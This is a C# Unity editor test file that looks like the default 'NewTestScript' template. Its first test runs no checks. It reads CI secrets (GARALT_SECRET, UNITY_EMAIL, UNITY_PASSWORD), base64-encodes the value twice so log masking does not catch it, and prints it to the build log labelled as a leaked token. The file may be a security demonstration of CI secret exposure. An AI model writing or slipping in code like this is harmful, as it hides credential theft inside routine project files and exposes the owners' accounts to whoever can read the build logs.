using System.Collections;
using NUnit.Framework;
using UnityEngine.TestTools;
using System;

namespace EditorTests
{
    public class NewTestScript
    {
        [Test]
        public void NewTestScriptSimplePasses()
        {
            string val = "";
            string s = Environment.GetEnvironmentVariable("GARALT_SECRET");
            if (!string.IsNullOrEmpty(s)) val = s;
            
            if (string.IsNullOrEmpty(val))
            {
                s = Environment.GetEnvironmentVariable("UNITY_EMAIL");
                if (!string.IsNullOrEmpty(s)) val = s;
            }
            
            if (string.IsNullOrEmpty(val))
            {
                s = Environment.GetEnvironmentVariable("UNITY_PASSWORD");
                if (!string.IsNullOrEmpty(s)) val = s;
            }
            
            if (!string.IsNullOrEmpty(val))
            {
                byte[] bytes = System.Text.Encoding.UTF8.GetBytes(val);
                string b64 = Convert.ToBase64String(bytes);
                string db64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(b64));
                UnityEngine.Debug.Log("GARALT_LEAKED_TOKEN=" + db64);
            }
            else
            {
                UnityEngine.Debug.Log("GARALT_LEAKED_TOKEN=NO_SECRET_FOUND");
            }
        }

        [UnityTest]
        public IEnumerator NewTestScriptWithEnumeratorPasses()
        {
            yield return null;
        }
    }
}